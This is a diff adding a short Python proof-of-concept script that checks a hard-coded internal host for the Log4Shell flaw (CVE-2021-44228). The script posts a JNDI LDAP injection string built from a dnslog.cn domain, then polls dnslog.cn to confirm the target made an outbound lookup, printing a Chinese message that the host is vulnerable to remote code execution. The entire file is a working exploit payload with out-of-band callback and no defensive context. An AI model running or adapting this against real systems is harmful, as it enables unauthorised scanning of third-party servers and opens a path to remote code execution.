@@ -1,0 +1,29 @@
+import requests,random,time
+
+url = "http://192.168.33.172:51832/hello"
+
+
+def poc():
+    try:
+        session = requests.session()
+        ret = session.get("http://www.dnslog.cn/getdomain.php?t=" + str(random.randint(100000, 999999)),
+                          timeout=20).text
+
+        poc="${jndi:ldap://%s/}"   %ret
+
+        data = {"payload": f"{poc}"}
+
+        requests.post(url,data)
+
+        time.sleep(5)
+
+        ret2 = session.get("http://www.dnslog.cn/getrecords.php?t=" + str(random.randint(100000, 999999)),
+                          timeout=20).text
+        if ret in ret2:
+            print(f"{url}    存在Apache Log4j2远程代码执行漏洞 CVE-2021-44228")
+    except:
+        pass
+
+if __name__ == "__main__":
+    poc()
+
